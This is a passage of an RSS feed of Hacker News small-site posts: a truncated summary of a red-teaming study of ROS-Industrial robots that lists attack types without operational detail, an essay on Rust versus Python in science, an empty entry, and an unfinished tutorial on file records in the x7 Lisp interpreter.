<p>ROS' popularity has continued to grow in industry supported by projects like ROS-Industrial (ROS-I for short)<sup><a href="#fn1" id="fnref1">[1]</a></sup>, an open-source initiative that extends the advanced capabilities of ROS software to industrial relevant hardware and applications. Spearheaded by the ROS-Industrial consortium, its deployment in industry is now a reality. The consortium has more than 80 members and its gatherings in Europe, USA and Asia bring together hundreds of robotics experts every year.</p>
<p>
    <img alt="ros_readteaming_scenario" src="https://cybersecurityrobotics.net/content/images/2020/09/esquema-3-.png">
    </p><figcaption>
        <strong>Use case architecture diagram</strong>. The synthetic scenario presents a network segmented in 5 levels with segregation implemented following recommendations in NIST SP 800-82 and IEC 62443 family of standards. There are 6 identical robots from Universal Robots presenting a variety of networking setups and security measures, each connected to their controller. $\hat{S_n}$ and $\hat{C_n}$ denote security hardened versions of an $n$ control station or controller respectively.
    </figcaption>

<p>With dozens of publicly available speeches on how ROS is being used for automation tasks, open source tools available and system integrators picking ROS for real problems under safety constraints, we argue that it is nowadays a relevant piece of software used for industry. Unfortunately, as it's often common in industry, security is not a priority.</p>
<p>ROS was not designed with security in mind, but as it started being adopted and deployed into products or used in government programs, more attention was placed on it. Some of the early work on securing ROS include <sup><a href="#fn2" id="fnref2">[2]</a></sup>, <sup><a href="#fn3" id="fnref3">[3]</a></sup> or <sup><a href="#fn4" id="fnref4">[4]</a></sup>, all of them appearing in the second half of 2016.  At the time of writing, none of these efforts remain actively maintained and the community focus on security efforts has switched to ROS 2, the next generation of ROS. ROS 2 builds on top of DDS and shows promise. However, to the best of our knowledge, there're still no known robots running ROS 2 in production at scale. From our experience analyzing robots used in industry, their operating systems, libraries and dependencies, we argue that ROS 2 is still years from being widely deployed for major automation tasks. Until then, ROS will prevail.</p>
<h3 id="researchquestion">Research question</h3>
<p>With the advent of ROS in industry and professional use, one question remains:</p>
<blockquote>
<p>Even though ROS was not designed with security in mind, can companies use it securely for industrial use cases?</p>
</blockquote>
<p>The work introduced in here tackles this question experimentally by performing a <mark>targeted security exercise</mark>, namely <strong>red teaming</strong>, to determine whether ROS and more specifically, ROS and ROS-Industrial packages could be used securely in an industrial setup. We construct a synthetic industrial scenario and choose one of the most common industrial robots with ROS-I support to build it. We then apply available security measures to the setup following official recommendations and program a simple flow of operation.</p>
<p>Using this setup, we perform a red teaming exercise with the following two goals:</p>
<ul>
<li><mark>Goal $G_1$</mark>: Control, deny access or disrupt the ROS computational graph.</li>
<li><mark>Goal $G_2$</mark>: Control, deny access or disrupt the operation of robots (ROS-powered or not)<sup><a href="#fn5" id="fnref5">[5]</a></sup>.</li>
</ul>
<p>To achieve these goals, we create four different attacks that target the ROS-Industrial and ROS packages. The results show that ROS Melodic Morenia presents several unpatched security flaws, even when hardened with community recommendations. For details on the attacks, refer to <sup><a href="#fn6" id="fnref6">[6]</a></sup>.</p>
<h3 id="redteaming">Red teaming</h3>
<p>
    <img alt="ros_readteaming_scenario" src="https://cybersecurityrobotics.net/content/images/2020/09/attack-1-1-.png">
    </p><figcaption>
        <strong>Attack targeting ROS-Industrial and ROS core packages</strong>. The attacker exploits a vulnerability present in a ROS package running on $\hat{S_7}$ (actionlib). Since $\hat{S_7}$ is acting as the ROS Master, segregation does not impose restrictions on it and it is thereby used to access other machines in the OT level to send control commands.
    </figcaption>

<p>Red teaming is a full-scope, holistic and targeted (with specific goals) attack simulation designed to measure how well a system can withstand an attack. Opposed to Penetration Testing (<em>pentesting</em> or PT), a red teaming activity does not seek to find as many vulnerabilities as possible to risk-assess them, but has a specific goal. Red teaming looks for vulnerabilities that will maximize damage and meet the selected goals. Its ultimate objective is to test an organization/system detection and response capabilities in production and with respect a given set of objectives. Past works in robot cybersecurity criticize the current status of cybersecurity in robotics and reckon the need of further research. Previous attempts to review the security of robots via offensive exercises or tools mostly focus on proof-of-concept attacks and basic penetration testing, detecting flaws in ROS. A recent study <sup><a href="#fn7" id="fnref7">[7]</a></sup> mentions the identification of several flaws within ROS-Industrial codebase, however it does not explicitly describe  ROS-specific flaws.  Considerations are made with regard the open and insecure architecture predominant in ROS-Industrial deployments throughout its open source drivers. From interactions with the authors of <sup><a href="#fn7" id="fnref7:1">[7:1]</a></sup>, it was confirmed that the reported security issues were made generic on purpose, further highlighting the need for further investment on understanding the security landscape of ROS-Industrial setups.</p>
<p>To the best of our knowledge, no prior public work has performed a red teaming activity on ROS-Industrial packages (or in any other robotics technology for that matter), and challenged its security extensions. The work introduced in here presents a study in which we aim to do so in a realistic industrial scenario.</p>
<h3 id="discussion">Discussion</h3>
<h4 id="findings">Findings</h4>
<table>
<thead>
<tr>
<th>Attack</th>
<th>Description</th>
<th>Goals met</th>
</tr>
</thead>
<tbody>
<tr>
<td>$A_{1.1}$: remove arbitrary code execution</td>
<td>Subject to some prior interactions, attacker with control of $D_1$ is able to exploit a vulnerability in ROS and launch arbitrary remote code executions from a privileged ROS end-point compromising completely the computational graph</td>
<td>$G_1$ and $G_2$ ($R_1$, $R_2$, $R_3$, $R_4$ and  $R_5$)</td>
</tr>
<tr>
<td>$A_{1.2}$: privilege escalation</td>
<td>Subject to local access, attacker is able to exploit a vulnerability in ROS and escalate privileges (to the ROS ones) in such machine</td>
<td>$G_1$</td>
</tr>
<tr>
<td>$A_{2}$: FIN-ACK flood attack targeting ROS</td>
<td>Attacker attempts to deny ROSTCP connection on target destination by forcing a maxed-out number of connections</td>
<td>$G_1$ and $G_2$ ($R_1$, $R_2$, $R_3$, $R_4$ and $R_5$)</td>
</tr>
<tr>
<td>$A_3$: PitM attack to a ROS control station &amp; Attacker poisons ARP tables and gains access to the network flow of information siting between targeted publishers and subscribers, interfering with communications as desired.</td>
<td>$G_1$ and $G_2$ ($R_1$, $R_2$, $R_3$, $R_4$ and $R_5$)</td>
<td></td>
</tr>
<tr>
<td>$A_4$: Insider endpoint via unprotected robot controller</td>
<td>Attackers exploit known vulnerabilities in a robot endpoint to compromise the controller and pivot into the ROS network.</td>
<td>$G_1$ and $G_2$ ($R_1$, $R_2$, $R_3$, $R_4$, $R_5$ and $R_6$)</td>
</tr>
</tbody>
</table>
<p>$G_1$ is achieved in all the presented attacks whereas $G_2$ is mostly achieved yet depends on the hardening of the corresponding control stations and robotic endpoints.<br>
At the time of writing, among the vulnerabilities we exploited most remain active. An exception is <a href="https://github.com/aliasrobotics/RVD/issues/2401">RVD#2401</a> which got resolved by Open Robotics within 30 hours from the moment we submitted a mitigation.</p>
<h4 id="lessonslearned">Lessons learned</h4>
<p>Through our experiments we showed how control stations running Ubuntu 18.04 do not protect ROS or ROS-Industrial deployments. Moreover, the guidelines offered by Canonical <sup><a href="#fn8" id="fnref8">[8]</a></sup> for securing ROS are of little use against targeted attacks, as demonstrated. Certain ongoing hardening efforts for ROS Melodic <sup><a href="#fn9" id="fnref9">[9]</a></sup> helped mitigate some issues but regardless, most goals were still achieved with attacks targeting threats like zero days, wide and availability of industrial components, inadequate security practices or non-patched OS and firmware.</p>
<blockquote>
<p>control stations running Ubuntu 18.04 do not protect ROS or ROS-Industrial deployments. Moreover, the guidelines offered by Canonical <sup><a href="#fn8" id="fnref8:1">[8:1]</a></sup> for securing ROS are of little use against targeted attacks, as demonstrated.</p>
</blockquote>
<p>Dedicated robotic security protection systems like the <a href="https://aliasrobotics.com/ris.php">Robot Immune System (RIS)</a> used in $\hat{C_2}$, $\hat{C_5}$ or $\hat{C_6}$ managed to secure the corresponding robot avoiding directed attacks however $R_2$ and $R_5$ robots were still<em>hijacked</em> by compromising the ROS computational graph via their control stations. RIS was not able to stop these attacks because they came from trusted sources whose behavior was learned over a prior training phase. An ‚Ä¶</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://cybersecurityrobotics.net/red-teaming-the-ros-in-industry/">https://cybersecurityrobotics.net/red-teaming-the-ros-in-industry/</a></em></p>]]>
            </description>
            <link>https://cybersecurityrobotics.net/red-teaming-the-ros-in-industry/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24514906</guid>
            <pubDate>Fri, 18 Sep 2020 10:05:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Rust in Science and ever-changing requirements]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24514890">thread link</a>) | @lukastyrychtr
<br/>
September 18, 2020 | https://amanjeev.com/blog/rust-in-science-and-ever-changing-requirements | <a href="https://web.archive.org/web/*/https://amanjeev.com/blog/rust-in-science-and-ever-changing-requirements">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-a12f56daf5f5d65fe346"><div><p>I have heard many times over that for a given proof-of-concept if you have fast, changing requirements, then you are better off with a <a href="https://en.wikipedia.org/wiki/Dynamic_programming_language">Dynamic programming language</a> like Python. Python gives the illusion of faster development because you do not have to think about the <em>rigidity</em> of the <a href="https://en.wikipedia.org/wiki/Type_system">Type system</a> as much. Hence, it makes these dynamic languages good for prototyping and creating proofs-of-concept.</p><p>However, in this essay, I am trying to dump some thoughts about <a href="https://www.rust-lang.org/">Rust</a> usage in scientific computation, its benefits, and generic chatter in the community. I think using Rust has an advantage in an ever-mutating environment like research and I think even for prototyping, Rust can be much more beneficial than a language like Python.</p><h2>Introduction </h2><p>I am very much in a love affair with Rust. This is not going to come to you as a surprise at all if you <a href="https://twitter.com/amanjeev">follow me on Twitter</a>. Part of the reason is that I work as a software writer and general yak shaver for science-(genomics)-adjacent work and I appreciate what Rust has to offer in terms of the ecosystem, safety, and speed. I'd argue that a lot of work that is usually written in C/C++, Python, Perl, etc. could be replaced by Rust.</p><p>Perhaps I do not need to spend a lot of effort to convince you that Rust can replace some C/C++ codebase more easily because Rust is a <a href="https://en.wikipedia.org/wiki/System_programming_language">Systems programming language</a>. But for proofs-of-concept, you ask, how can Rust be better than, say Python? Isn't it painful to change the code, which you do in early prototyping when you have to use a Static language[1]?</p><h2>The case of Python</h2><p>When I started in the sciences as a programmer, reading Perl was always an issue and the choice that I had to make was clear to me ‚Äî I chose Python. Perl was slowly being displaced by Python anyway. So, I will give you some anecdotal comparisons from my experiences.</p><p>You might think that I am comparing apples to oranges and you are absolutely correct. This is an opinion blog post! I am choosing Python also because it is touted as the language which makes life easier to work with given ever-changing requirements.</p><h2>Ever-changing requirements</h2><p>One issue that I always hear is the idea of ‚Äúrefactoring‚Äù and/or ‚Äúchanging course‚Äù. Computation in sciences, they say, is a lot of trial and error. I find this to be true! I have worked in novel projects where even the stakeholders (scientists) were learning while we were building the projects. There is a lot of backtracking and honestly a lot of your "software engineering" breaks down.</p><p>For this article, I am going to focus on some attributes of languages that instill confidence in making the changes so that you can iterate. I believe the following attributes are necessary to work with constantly changing requirements ‚Äî</p><ol data-rte-list="default"><li><p>Readability</p></li><li><p>Testability</p></li><li><p>Feedback</p></li><li><p>Toolchain</p></li></ol><h3>Readability</h3><h4>Syntax</h4><p>The clear advantage of Python is its syntactic readability if you are considerate of that while writing (but it does not always pan out!). This means that it is easier to keep the code in your head to make the model, while you are making changes. Rust can be hard to read because it does not fit the imperative, object-oriented style mental model we have with languages like Python. Rust‚Äôs ownership model and typing definitely have some learning curve.</p><p>I have taught Git and Python to my colleagues and in many ways, they ‚Äî and I ‚Äî have had to build new mental models for these tools as well, especially if they are already familiar with C++, Perl, and SVN, CVS. Learning new mental models is what we do all the time. Still, I agree that this requires a lot of effort on the programmer‚Äôs part. This is especially true for an experienced programmer.</p><p>As <a href="https://twitter.com/ekuber">Esteban</a> says in his <a href="https://youtu.be/Z6X7Ada0ugE">RustConf 2020 talk ‚Äî Bending the Curve: A Personal Tutor at Your Fingertips</a> ‚Äî </p><blockquote><p><em>Rust has a curse, it has many but this one is critical ‚Äî inefficient code is generally visible. Experienced developers hate to notice that their code is inefficient.</em></p></blockquote><h4>Jumping around the codebase</h4><p>Rust is statically typed, empowers your editor or <a href="https://en.wikipedia.org/wiki/Integrated_development_environment">Integrated Development Environment (IDE)</a> to link the symbols in your code for easy access. A function defined somewhere in a <code>struct</code> can be easily found from where it is called. This makes looking up code for dependencies much easier and faster.</p><p>The only tool in Python that brings us any closer to this style of working is <a href="https://www.jetbrains.com/pycharm/">JetBrains PyCharm</a>. And even this IDE for Python fails to look up <em>symbols</em> if you mess up your <code><a href="https://docs.python.org/3/tutorial/venv.html">virtualenv</a></code> or fail to register it with your PyCharm project. You can use <code><a href="https://docs.python.org/3/library/typing.html">typing</a></code> to annotate your code with the types but as you can see that there is a warning at the top of <a href="https://docs.python.org/3/library/typing.html">the </a><code><a href="https://docs.python.org/3/library/typing.html">typing</a></code><a href="https://docs.python.org/3/library/typing.html"> documentation</a> -</p><blockquote><p><em>Note: The Python runtime does not enforce function and variable type annotations. They can be used by third-party tools such as type checkers, IDEs, linters, etc.</em></p></blockquote><p>With Rust, you can survive with just the compiler because these types are a part of the language. Add <a href="https://github.com/rust-lang/rls">Rust Langauge Server (RLS)</a> to that and you can comfortably navigate your codebase.</p><h4>Docs!</h4><p>Since Rust is statically typed, you can see what is the expected type of each function argument or what is the type of the value that the function returns. Its type system becomes part of the documentation! Whereas in Python you have to use external tools and depend on function annotations to generate documentation, <a href="https://doc.rust-lang.org/rustdoc/what-is-rustdoc.html">Rust brings the documentation to you via </a><code><a href="https://doc.rust-lang.org/rustdoc/what-is-rustdoc.html">rustdoc</a></code>.</p><p>For example, please compare ‚Äî</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1599922045084_5505"><div><p>It is a tiny example and while Rust's syntax is denser, it also provides clarity on what the elements stand for. Here, <code><strong>ChillinNum</strong></code> is the type of the return value. We could have just used <code><strong>u32</strong></code> but using <code><strong>ChillinNum</strong></code> is clearer. If you run <code>cargo doc</code> in your codebase, Rust compiler will take all these triple-slash <code><strong>///</strong></code> comments and generate nice documentation for you. You can see the <a href="https://docs.rs/eyre/0.6.0/eyre/">documentation of the crate </a><code><a href="https://docs.rs/eyre/0.6.0/eyre/"><strong>eyre</strong></a></code> and the <a href="https://github.com/yaahc/eyre/blob/master/src/lib.rs">source of the crate </a><code><a href="https://github.com/yaahc/eyre/blob/master/src/lib.rs"><strong>eyre</strong></a></code><a href="https://github.com/yaahc/eyre/blob/master/src/lib.rs"> that generates it</a>.</p><h3>Testability</h3><p>Python has a ton of testing frameworks and Rust is slowly catching up. A clear advantage in favor of Python. However, the things you are testing also dictate how much confidence you have in your codebase. With the type system in Rust, you do not have to test for certain cases that in Python you‚Äôd have to. This means there are certain test cases that you do not need to write if you‚Äôre building your project in Rust. To me, this makes the iteration faster with more confidence in the code I am writing.</p><p>As <a href="https://twitter.com/ekuber">Esteban</a> puts it ‚Äî</p><blockquote><p><em>The reduced need for tests is because of using patterns that leverage the type system to completely eliminate the representability of an invalid state.</em></p></blockquote><p>Take Rust's <code>match</code> pattern, as an example. The following code will fail to compile because we failed to provide a catch-all ‚Äî</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1599922045084_6952"><p>Previously, we had provided the default/catch-all case<strong> </strong><code><strong>_ =&gt; return 0,</strong></code>. Similarly, the Rust compiler will complain if you are not covering all the variants of a Rust <code><strong>enum</strong></code> in your <code><strong>match</strong></code> pattern. This helps the programmer in considering all the paths and cases. The compiler will show an error like this ‚Äî</p></div><div data-block-type="2" id="block-yui_3_17_2_1_1599922045084_8590"><div><p>I do not enjoy writing tests and eating my veggies but if I could eat fewer veggies to achieve the same level of confidence in my changes, I‚Äôd always choose that.</p><p>This also brings me to the point of designing your project. Just because your project is in alpha/beta/whateva, does not mean that you are not allowed to think about your data structures, your types before the implementation. A little bit of thought in the structure of your codebase goes a long way, especially when you have to change it. Once again, listen to <a href="https://twitter.com/ekuber">Esteban</a> ‚Äî</p><blockquote><p><em>Thinking about the API surface first and then changing the internal logic and in-memory representation to make it faster/more efficient is much easier in type-safe languages than in dynamic languages, and more so in Rust simply because more things are represented in the type system than is customary in other languages. This makes "iteratively fixing the compiler errors" a valid refactoring strategy.</em></p></blockquote><p>These points, to me, sound like Rust has more advantages than Python if we count Testing as a property of confidence in the changes we are making.</p><h3>Feedback </h3><p>Even though Rust has its <em>new</em> paradigm issues[2] when it comes to learning the language, I still feel that Rust compiler emits some of the most helpful error messages and help messages. The safety features are built right into the compiler and the team has done a fantastic job so far in making messages ergonomic. For example, in Rust, the array out of bounds error looks like this ‚Äî</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1599922045084_10179"><p>For Python, this looks like this ‚Äî</p></div><div data-block-type="2" id="block-yui_3_17_2_1_1599922045084_11540"><p>We've already seen an error message above for missing catch-all but let me show that again ‚Äî</p></div><div data-block-type="2" id="block-yui_3_17_2_1_1599922045084_12616"><div><p>Side note: It is amazing that languages can and do learn from each other and copy parts that seem helpful for the users. One recent exciting case is <a href="https://devblogs.microsoft.com/cppblog/new-safety-rules-in-c-core-check/">New safety rules in C++ Core Check</a>. I am very happy to have other languages learn, as Rust has from what came before.</p><p>I hope you can appreciate the effort being put into the compiler and its error messages. Once again, <a href="https://twitter.com/ekuber">Esteban</a>‚Äôs talk is a fantastic watch, where he talks about the Rust compiler as a tutor.</p><blockquote><p><em>When we are emitting diagnostic errors, it is the perfect place and moment to teach people [that] they have made a mistake and we can explain to them why they made it.</em></p></blockquote><p>I will embed the talk here for you ‚Äî</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1599922045084_16054"><div><p>Python, on the other hand, had me stuck for a whole day because it complained somewhere I was scripting <code><strong>NoneType</strong></code>. If you care, this is the pet peeve that started this blog post.</p><h3>Toolchain</h3><p>In the Python world, the packaging and environment setup is still something that makes me sad. The closest I have come to create some sanity in my life is to use <code><strong>direnv</strong></code> and <code><strong>shell</strong>.<strong>nix</strong></code> in my repositories. This sucks because this is a solution that is at the OS (NixOS) level[3]. Indeed there are tools available for auto-loading environments, and I am thankful for that. However, Python toolset feels like a moving target. Years ago, it was just <code><strong>setup</strong>.<strong>py</strong></code> and today it is <code><strong>setup</strong>.<strong>cfg</strong></code>, <code><strong>pyproject</strong>.<strong>toml</strong></code> as well but the latter two do not support all the features so you end up having <code><strong>setup</strong>.<strong>py</strong></code> in your codebase. Here, <a href="https://snarky.ca/what-the-heck-is-pyproject-toml/">let Tall, Snarky Canadian explain it to you</a>. </p><p>On ‚Ä¶</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://amanjeev.com/blog/rust-in-science-and-ever-changing-requirements">https://amanjeev.com/blog/rust-in-science-and-ever-changing-requirements</a></em></p>]]>
            </description>
            <link>https://amanjeev.com/blog/rust-in-science-and-ever-changing-requirements</link>
            <guid isPermaLink="false">hacker-news-small-sites-24514890</guid>
            <pubDate>Fri, 18 Sep 2020 10:01:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Oxidizing Portals with Zbus]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24514707">thread link</a>) | @lukastyrychtr
<br/>
September 18, 2020 | https://belmoussaoui.com/article/13-oxidizing-portals | <a href="https://web.archive.org/web/*/https://belmoussaoui.com/article/13-oxidizing-portals">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://belmoussaoui.com/article/13-oxidizing-portals</link>
            <guid isPermaLink="false">hacker-news-small-sites-24514707</guid>
            <pubDate>Fri, 18 Sep 2020 09:27:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Implementing Records in X7]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24514658">thread link</a>) | @lukastyrychtr
<br/>
September 18, 2020 | https://dpbriggs.ca/blog/Implementing-Method-Calls-In-x7 | <a href="https://web.archive.org/web/*/https://dpbriggs.ca/blog/Implementing-Method-Calls-In-x7">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="text-org2fd690a">
<p>
The original motivation for adding <code>Record</code> to <code>x7</code> is the ability to open, read, and write to files.
We'll back the <code>x7</code> File implementation by the <code>rust</code> File struct, so let's make a new file in <code>x7</code> - <code>records/file.rs</code>:
</p>
<p>
We will start by making a <code>FileRecord</code> struct:
</p>
<div>
<pre><span>#</span><span>[</span><span>derive</span><span>(</span><span>Clone, Debug</span><span>)</span><span>]</span>
<span>pub</span><span>(</span><span>crate</span><span>)</span> <span>struct</span> <span>FileRecord</span> <span>{</span>
    <span>path</span>: <span>String</span>,
    <span>// </span><span>The Record trait requires Sync + Send</span>
    <span>file</span>: <span>Arc</span><span>&lt;</span><span>Mutex</span><span>&lt;</span><span>std</span>::<span>fs</span>::<span>File</span><span>&gt;</span><span>&gt;</span>,
<span>}</span>
</pre>
</div>
<p>
The type <code>Arc&lt;Mutex&lt;std::fs::File&gt;&gt;</code> is necessary as <code>x7</code> requires all types to be thread safe.
</p>
<p>
Now that we have a struct, let's expose a way to generate one from <code>x7</code>. We want the following <code>x7</code> expression to work:
</p>

<p>
This will map to a <code>Expr::String("file-name")</code> in the interpreter, so we need two methods:
</p>
<ol>
<li>A way to open files given a <code>String</code></li>
<li>A way to open files given an <code>Expr::String</code></li>
</ol>
<p>
With that in mind, here's the two relevant methods:
</p>
<div>
<pre><span>impl</span> <span>FileRecord</span> <span>{</span>
      <span>/// Open a file with the given Path</span>
      <span>pub</span><span>(</span><span>crate</span><span>)</span> <span>fn</span> <span>open_file</span><span>(</span><span>path</span>: <span>String</span><span>)</span> -&gt; <span>LispResult</span><span>&lt;</span><span>Expr</span><span>&gt;</span> <span>{</span>
      <span>// </span><span>Open the file with liberal permissions.</span>
      <span>let</span> <span>f</span> = <span>OpenOptions</span>::new<span>()</span>
          .write<span>(</span><span>true</span><span>)</span>
          .create<span>(</span><span>true</span><span>)</span>
          .read<span>(</span><span>true</span><span>)</span>
          .open<span>(</span>path.clone<span>()</span><span>)</span>
          .map_err<span>(</span>|e| <span>anyhow!</span><span>(</span><span>"Could not open file \"{}\" because {}"</span>, &amp;path, e<span>)</span><span>)</span><span>?</span>;
      <span>// </span><span>Make the path pretty.</span>
      <span>let</span> <span>abs_path</span> = <span>fs</span>::canonicalize<span>(</span>path<span>)</span>
          .map_err<span>(</span>|e| <span>anyhow!</span><span>(</span><span>"Could not canonicalize path! {}"</span>, e<span>)</span><span>)</span><span>?</span>
          .to_str<span>()</span>
          .ok_or_else<span>(</span>|| <span>anyhow!</span><span>(</span><span>"Could not represent path as UTF-8 string"</span><span>)</span><span>)</span><span>?</span>
          .into<span>()</span>;
      <span>// </span><span>record! is a macro to assist in making LispResult&lt;Expr::Record&gt; types</span>
      <span>record!</span><span>(</span><span>FileRecord</span>::new<span>(</span>f, abs_path<span>)</span><span>)</span>
  <span>}</span>

  <span>/// Open a file from x7</span>
  <span>/// This function signature will let us expose it directly to the interpreter</span>
  <span>pub</span><span>(</span><span>crate</span><span>)</span> <span>fn</span> <span>from_x7</span><span>(</span><span>exprs</span>: <span>Vector</span><span>&lt;</span><span>Expr</span><span>&gt;</span>, <span>_symbol_table</span>: &amp;<span>SymbolTable</span><span>)</span> -&gt; <span>LispResult</span><span>&lt;</span><span>Expr</span><span>&gt;</span> <span>{</span>
      <span>exact_len!</span><span>(</span>exprs, <span>1</span><span>)</span>;
      <span>let</span> <span>path</span> = exprs<span>[</span><span>0</span><span>]</span>.get_string<span>()</span><span>?</span>;
      <span>FileRecord</span>::open_file<span>(</span>path<span>)</span>
  <span>}</span>
<span>}</span>
</pre>
</div>
<p>
Now that we have the ability to make a <code>FileRecord</code>, we'll need to implement <code>Record</code>
so it can be understood by the interpreter (<code>Expr::Record</code>).
</p>
<div>
<pre><span>impl</span> <span>Record</span> <span>for</span> <span>FileRecord</span> <span>{</span>
    <span>fn</span> <span>call_method</span><span>(</span>&amp;<span>self</span>, <span>sym</span>: &amp;<span>str</span>, <span>args</span>: <span>Vector</span><span>&lt;</span><span>Expr</span><span>&gt;</span><span>)</span> -&gt; <span>LispResult</span><span>&lt;</span><span>Expr</span><span>&gt;</span> <span>{</span>
      <span>// </span><span>We have no methods yet.</span>
      <span>unknown_method!</span><span>(</span><span>self</span>, sym<span>)</span>
    <span>}</span>

    <span>fn</span> <span>type_name</span><span>(</span>&amp;<span>self</span><span>)</span> -&gt; &amp;'<span>static</span> <span>str</span> <span>{</span>
        <span>"FileRecord"</span>
    <span>}</span>

    <span>fn</span> <span>display</span><span>(</span>&amp;<span>self</span><span>)</span> -&gt; <span>String</span> <span>{</span>
        <span>format!</span><span>(</span><span>"File&lt;</span><span>{}</span><span>&gt;"</span>, <span>self</span>.path<span>)</span>
    <span>}</span>

    <span>fn</span> <span>debug</span><span>(</span>&amp;<span>self</span><span>)</span> -&gt; <span>String</span> <span>{</span>
        <span>self</span>.display<span>()</span>
    <span>}</span>

    <span>fn</span> <span>clone</span><span>(</span>&amp;<span>self</span><span>)</span> -&gt; <span>RecordType</span> <span>{</span>
        <span>Box</span>::new<span>(</span><span>Clone</span>::clone<span>(</span><span>self</span><span>)</span><span>)</span>
    <span>}</span>

    <span>fn</span> <span>methods</span><span>(</span>&amp;<span>self</span><span>)</span> -&gt; <span>Vec</span><span>&lt;</span>&amp;'<span>static</span> <span>str</span><span>&gt;</span> <span>{</span>
        <span>Vec</span>::new<span>()</span>
    <span>}</span>

    <span>fn</span> <span>id</span><span>(</span>&amp;<span>self</span><span>)</span> -&gt; <span>u64</span> <span>{</span>
        <span>use</span> <span>std</span>::<span>collections</span>::<span>hash_map</span>::<span>DefaultHasher</span>;
        <span>use</span> <span>std</span>::<span>hash</span>::<span>{</span><span>Hash</span>, <span>Hasher</span><span>}</span>;
        <span>let</span> <span>mut</span> <span>h</span> = <span>DefaultHasher</span>::new<span>()</span>;
        <span>self</span>.path.hash<span>(</span>&amp;<span>mut</span> h<span>)</span>;
        h.finish<span>()</span>
    <span>}</span>
<span>}</span>
</pre>
</div>
<p>
We also need to expose <code>FileRecord::from_x7</code> to the interpreter, so let's head back and add it to <code>make_stdlib_fns</code>:
</p>
<div>
<pre> <span>make_stdlib_fns!</span><span>{</span>
  <span>// </span><span>elided functions...</span>
  <span>(</span><span>"call_method"</span>, <span>2</span>, call_method, <span>true</span>, <span>"&lt;doc-string&gt;"</span><span>)</span>,
  <span>// </span><span>Open a file</span>
  <span>(</span><span>"fs::open"</span>, <span>1</span>, <span>FileRecord</span>::from_x7, <span>true</span>, <span>"Open a file."</span><span>)</span>,
<span>}</span>
</pre>
</div>
<p>
We can now compile and run <code>x7</code> to see what happens:
</p>
<div>
<pre>&gt;&gt;&gt; <span>(</span>def f <span>(</span>fs::open <span>"hello-world.txt"</span><span>)</span><span>)</span>
nil
&gt;&gt;&gt; f
File&lt;/home/david/programming/x7/hello-world.txt&gt;
</pre>
</div>
<p>
Nice! We've opened a file. We can now implement some other useful methods on <code>FileRecord</code> like reading from a file:
</p>
<div>
<pre><span>impl</span> <span>FileRecord</span> <span>{</span>
  <span>/// Read the contents of a file to a String,</span>
  <span>/// rewinding the cursor to the front.</span>
  <span>fn</span> <span>read_all</span><span>(</span>&amp;<span>self</span><span>)</span> -&gt; <span>LispResult</span><span>&lt;</span><span>String</span><span>&gt;</span> <span>{</span>
      <span>let</span> <span>mut</span> <span>buf</span> = <span>String</span>::new<span>()</span>;
      <span>let</span> <span>mut</span> <span>guard</span> = <span>self</span>.file.lock<span>()</span>;
      guard
          .read_to_string<span>(</span>&amp;<span>mut</span> buf<span>)</span>
          .map_err<span>(</span>|e| <span>anyhow!</span><span>(</span><span>"Failed to read to string {}"</span>, e<span>)</span><span>)</span><span>?</span>;
      <span>rewind_file!</span><span>(</span>guard<span>)</span>;
      <span>Ok</span><span>(</span>buf<span>)</span>
  <span>}</span>

  <span>/// Read the contents of a FileRecord to a string.</span>
  <span>fn</span> <span>read_to_string</span><span>(</span>&amp;<span>self</span>, <span>args</span>: <span>Vector</span><span>&lt;</span><span>Expr</span><span>&gt;</span><span>)</span> -&gt; <span>LispResult</span><span>&lt;</span><span>Expr</span><span>&gt;</span> <span>{</span>
      <span>// </span><span>We want no arguments.</span>
      <span>exact_len!</span><span>(</span>args, <span>0</span><span>)</span>;
      <span>self</span>.read_all<span>()</span>.map<span>(</span><span>Expr</span>::<span>String</span><span>)</span>
  <span>}</span>
<span>}</span>
</pre>
</div>
<p>
We can update our <code>Record</code> implementation for <code>FileRecord</code> to include this method:
</p>
<div>
<pre><span>impl</span> <span>Record</span> <span>for</span> <span>FileRecord</span> <span>{</span>
    <span>fn</span> <span>call_method</span><span>(</span>&amp;<span>self</span>, <span>sym</span>: &amp;<span>str</span>, <span>args</span>: <span>Vector</span><span>&lt;</span><span>Expr</span><span>&gt;</span><span>)</span> -&gt; <span>LispResult</span><span>&lt;</span><span>Expr</span><span>&gt;</span> <span>{</span>
        <span>match</span> sym <span>{</span>
            <span>"read_to_string"</span> =&gt; <span>self</span>.read_to_string<span>(</span>args<span>)</span>,
            _ =&gt; <span>unknown_method!</span><span>(</span><span>self</span>, sym<span>)</span>,
        <span>}</span>
    <span>}</span>
<span>}</span>
</pre>
</div>
<p>
And use it:
</p>
<div>
<pre>~ echo <span>"hello"</span> &gt; hello-world.txt
~ x7
&gt;&gt;&gt; <span>(</span>def f <span>(</span>fs::open <span>"hello-world.txt"</span><span>)</span><span>)</span>
&gt;&gt;&gt; <span>(</span>call_method f <span>"read_to_string"</span><span>)</span>
<span>"hello"</span>
</pre>
</div>
<p>
Awesome! We're able to call methods on <code>FileRecord</code>. It's the same process to implement <code>.write</code> and other useful file operations, so we'll elide it. This is great stuff, and would be even better with some syntactic sugar.
</p>
<p>
Let's add method call syntax so these two expressions are equal:
</p>
<div>
<pre>&gt;&gt;&gt; <span>(</span>call_method f <span>"read_to_string"</span><span>)</span>
